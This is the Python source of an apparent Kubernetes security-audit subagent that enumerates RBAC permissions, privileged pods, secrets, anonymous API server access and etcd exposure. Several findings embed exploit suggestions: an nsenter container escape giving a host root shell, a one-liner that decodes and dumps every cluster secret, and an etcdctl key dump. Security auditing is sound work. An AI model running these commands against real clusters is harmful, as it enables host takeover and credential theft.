"""
k8s_audit_subagent.py — Kubernetes cluster security audit.

AGENT_NAME  : "container"
SUBAGENT_NAME: "k8s_audit"

Methodology:
  1. kubectl auth can-i --list — enumerate RBAC permissions
  2. Enumerate secrets across namespaces
  3. Find privileged pods, hostPID/hostNetwork pods
  4. Check for default service account over-permission
  5. Enumerate ClusterRoleBindings with cluster-admin
  6. Run kube-bench for CIS benchmark
  7. Check etcd exposure, API server anonymous auth
"""
from __future__ import annotations
import logging, re
from typing import Any
from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

_ADMIN_RE    = re.compile(r'(cluster-admin|system:masters)', re.I)
_PRIV_POD_RE = re.compile(r'privileged:\s*true', re.I)
_HOST_RE     = re.compile(r'(hostPID:\s*true|hostNetwork:\s*true|hostIPC:\s*true)', re.I)
_SECRET_RE   = re.compile(r'^\s*([A-Za-z_]+):\s*(\S{8,})\s*$', re.M)
_ANON_RE     = re.compile(r'(anonymous|--anonymous-auth=true|system:anonymous)', re.I)


class K8sAuditSubagent(BaseSubagent):
    """Audit Kubernetes cluster configuration and RBAC."""

    AGENT_NAME    = "container"
    SUBAGENT_NAME = "k8s_audit"

    async def run(self, target: str, kubeconfig: str = "", namespace: str = "default", **kwargs: Any) -> SubagentResult:
        result  = SubagentResult(session_id=self.session_id, subagent_name=self.SUBAGENT_NAME, target=target)
        kc_flag = f"--kubeconfig {kubeconfig}" if kubeconfig else ""
        ns_flag = f"-n {namespace}"

        # ── 1. RBAC permissions ───────────────────────────────────────────
        perm_out = await self.collect_tool("kubectl", target,
            {"options": f"{kc_flag} auth can-i --list -A 2>&1"})
        wildcard_perms = [l for l in perm_out.splitlines() if l.strip().startswith("*")]

        if wildcard_perms:
            await self.store_finding(Finding(
                title=f"K8s RBAC: Wildcard Permissions — Current SA Has Over-Broad Access",
                description=f"Current service account has wildcard (*) verb permissions on: {wildcard_perms[:5]}. Effectively cluster-admin.",
                severity="CRITICAL", evidence="\n".join(wildcard_perms[:10]), tool="kubectl", host=target,
                mitre_technique="T1078.001",
                exploit_suggestion="Create privileged pod: kubectl run pwn --image=alpine --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"pwn\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--target\",\"1\",\"--mount\",\"--uts\",\"--ipc\",\"--net\",\"--pid\",\"--\",\"bash\"],\"securityContext\":{\"privileged\":true}}]}}'",
            ))

        # ── 2. ClusterRoleBindings with cluster-admin ─────────────────────
        crb_out = await self.collect_tool("kubectl", target,
            {"options": f"{kc_flag} get clusterrolebindings -o yaml 2>&1"})
        admin_bindings = [l for l in crb_out.splitlines() if _ADMIN_RE.search(l)]
        if admin_bindings:
            await self.store_finding(Finding(
                title=f"K8s RBAC: {len(admin_bindings)} cluster-admin Binding(s) Found",
                description=f"cluster-admin or system:masters role bindings: {admin_bindings[:5]}.",
                severity="HIGH", evidence="\n".join(admin_bindings[:10]), tool="kubectl", host=target,
                mitre_technique="T1078.001",
            ))

        # ── 3. Privileged pods ────────────────────────────────────────────
        pods_out = await self.collect_tool("kubectl", target,
            {"options": f"{kc_flag} get pods -A -o yaml 2>&1"})
        priv_pods = []
        if _PRIV_POD_RE.search(pods_out):
            priv_pods = re.findall(r'name:\s*(\S+)', pods_out[:2000])
        host_pods = bool(_HOST_RE.search(pods_out))

        if priv_pods or host_pods:
            await self.store_finding(Finding(
                title=f"K8s: {'Privileged' if priv_pods else ''}{' & ' if priv_pods and host_pods else ''}{'hostPID/hostNetwork' if host_pods else ''} Pod(s) Running",
                description=f"Dangerous pod security contexts found. Privileged: {bool(priv_pods)}, HostPID/Net: {host_pods}.",
                severity="CRITICAL", evidence=pods_out[:800], tool="kubectl", host=target,
                mitre_technique="T1611",
                exploit_suggestion="Exec into privileged pod: kubectl exec -it <pod> -- nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
            ))

        # ── 4. Secrets enumeration ────────────────────────────────────────
        secrets_out = await self.collect_tool("kubectl", target,
            {"options": f"{kc_flag} get secrets -A -o json 2>&1"})
        secret_count = len(re.findall(r'"kind"\s*:\s*"Secret"', secrets_out))
        if secret_count > 0:
            await self.store_finding(Finding(
                title=f"K8s Secrets: {secret_count} Secret(s) Accessible Across Cluster",
                description=f"{secret_count} Kubernetes secrets readable. May include API keys, DB passwords, TLS certs.",
                severity="HIGH", evidence=secrets_out[:500], tool="kubectl", host=target,
                mitre_technique="T1552.007",
                exploit_suggestion="Dump: kubectl get secrets -A -o json | jq '.items[].data | map_values(@base64d)'",
            ))

        # ── 5. API server anonymous auth / etcd ───────────────────────────
        api_anon = await self.collect_tool("curl", target,
            {"options": f"-sk --connect-timeout 5 https://{target}:6443/api/v1/namespaces 2>&1"})
        etcd_out = await self.collect_tool("curl", target,
            {"options": f"-sk --connect-timeout 5 http://{target}:2379/v2/keys 2>&1"})

        if "items" in api_anon.lower() or _ANON_RE.search(api_anon):
            await self.store_finding(Finding(
                title="K8s: API Server Allows Anonymous Access",
                description="Kubernetes API server accessible without authentication. All cluster resources potentially readable.",
                severity="CRITICAL", evidence=api_anon[:400], tool="curl", host=target,
                mitre_technique="T1078.001",
                exploit_suggestion=f"kubectl --server=https://{target}:6443 --insecure-skip-tls-verify get pods -A",
            ))

        if "key" in etcd_out.lower() and "index" in etcd_out.lower():
            await self.store_finding(Finding(
                title="K8s: etcd Accessible Without Auth — Full Cluster Compromise",
                description="etcd API accessible without authentication. Contains all K8s secrets including service account tokens and API keys.",
                severity="CRITICAL", evidence=etcd_out[:400], tool="curl", host=target,
                mitre_technique="T1552.007",
                exploit_suggestion=f"Dump all secrets: etcdctl --endpoints=http://{target}:2379 get / --prefix --keys-only",
            ))

        # ── 6. kube-bench CIS benchmark ───────────────────────────────────
        bench_out = await self.collect_tool("kube-bench", target, {"options": "run --targets node 2>&1 | tail -20"})
        fail_count = bench_out.count("[FAIL]")
        if fail_count:
            await self.store_finding(Finding(
                title=f"K8s CIS Benchmark: {fail_count} Check(s) Failed",
                description=f"kube-bench identified {fail_count} CIS Kubernetes benchmark failures on this node.",
                severity="MEDIUM", evidence=bench_out[:800], tool="kube-bench", host=target,
                mitre_technique="T1610",
            ))

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result
